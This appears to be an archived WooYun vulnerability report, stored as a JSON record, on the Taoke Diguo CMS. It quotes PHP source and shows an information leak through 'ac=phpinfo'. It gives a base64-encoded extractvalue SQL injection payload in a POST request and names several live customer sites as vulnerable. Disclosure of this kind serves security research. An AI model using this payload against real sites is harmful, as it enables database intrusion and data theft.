{"id": 30444, "wybug_id": "wooyun-2015-0116544", "wybug_title": "淘客帝国CMS 无视GPC注射和信息泄露2处", "wybug_corp": "淘客帝国", "wybug_author": "路人甲", "wybug_date": "2015-05-27 18:16", "wybug_open_date": "2015-07-11 18:18", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-05-27：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-07-11：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 淘客帝国CMS 无视GPC注射和信息泄露2处 详细说明：  source_usercenter.php:\n<?php$pagename_template = \"usercenter\";require_once WEBROOT.'include/function.php';dbconnect();$ac = htmlspecialchars(urldecode(var_request(\"ac\",\"\")));$redirect = htmlspecialchars(urldecode(var_request(\"redirect\",\"usercenter.php?ac=main\")));$inwin = htmlspecialchars(urldecode(var_request(\"inwin\",\"0\")));if($ac==\"shareframe\") {\t$inwin= 1;\t$redirect = \"usercenter.php?ac=shareframe\";\tif(!check_login()){\t\t\t\t\t//echo(\"<script language=\\\"JavaScript\\\">alert(\\\"请先登录哦。\\\");<//script>\");\t\t\t\t\t//$mod = \"ok\";\t\t\t\t\t//$dialog = \"add\";\t}}if(check_login()){\tif($ac==\"\") $ac = \"main\";}else{\tif ($ac!=\"login\" && $ac!=\"register\" && $ac!=\"verify\"){\t\t$ac = \"login\";\t}}//执行函数$ac();function loginout(){\tglobal $TaoConfig;\t$_SESSION['user_id'] = \"\";\tunset($TaoConfig[\"UserData\"]);\tunset($_SESSION);\tsetcookie (\"var_name\", $data[\"name\"], time()-604800);\tsetcookie (\"var_passwd\", $data[\"passwd\"], time()-604800);\tredirect_to($TaoConfig[\"rootroad\"].\"/\");\texit;}function shareframe(){\tglobal $Taoapi,$Global_headerCode,$dialog;\tglobal $TaoConfig;\tglobal $redirect;\tglobal $userpiddp;\t$mod = htmlspecialchars(urldecode(var_request(\"mod\",\"geturl\")));\t\t\t\t\t\t\t\t\tif($mod==\"setfield\"){\t\t\t\t\t\tif (isset($_POST['dosubmit'])) {\t\t\t\t\t\t\t\t\t$data = array();\t\t\t\t                    $data['info'] = htmlspecialchars(urldecode(var_request(\"info\",\"\")), ENT_NOQUOTES, \"GB2312\");                    $data['title'] = htmlspecialchars(urldecode($_POST[\"title\"]), ENT_NOQUOTES, \"GB2312\");\t\t\t\t                    $data['url'] = (base64_decode(var_request(\"url\",\"\")));\n首先看信息泄露//执行函数$ac(); 在这个之前完全没有白名单过滤1.注册用户登录2 url:http://localhost/taodiv6free_install/upload/usercenter.php?ac=phpinfo\n\n一处php文件泄露http://www.gd-men.com/phpinfo.phphttp://www.gd-men.com/phpinfo.php?act=phpinfo本地:http://localhost/taodiv6free_install/upload/phpinfo.php?act=phpinfo下来看sql注射$data['url'] = (base64_decode(var_request(\"url\",\"\")));看到这里 应该就明白了1注册用户url:http://localhost/taodiv6free_install/upload/usercenter.php?ac=shareframepostdata:url=http://www.baidu.com&mod=setfield&dosubmit=ok&url=eCcsZXh0cmFjdHZhbHVlKDEsIGNvbmNhdCgweDVjLCAoc2VsZWN0IHVzZXIoKSBmcm9tIGluZm9ybWF0aW9uX3NjaGVtYS50YWJsZXMgbGltaXQgMSkpKSwnJywnMScsJzEnLCcwJywnXzIxMHgyMTAuanBnJywnXzY0eDY0LmpwZycsJycsJzQnLCd0ZXN0JywnMTQzMjcxNjMwOCcsJzE0MzI3MTYzMDgnLCcxJywnMScsJzEnKSM%3D&pcid=1&\n\n外网举例子：\n\n\n\n几个客户的例子 http://www.gd-men.com/ http://www.gouwurewang.com/ http://www.guimishi.com/ http://szh666.com/http://www.hdg138.com/包括demo都是可以的 demov6.cnmysoft.cn 这里就不一一枚举了   漏洞证明：     修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}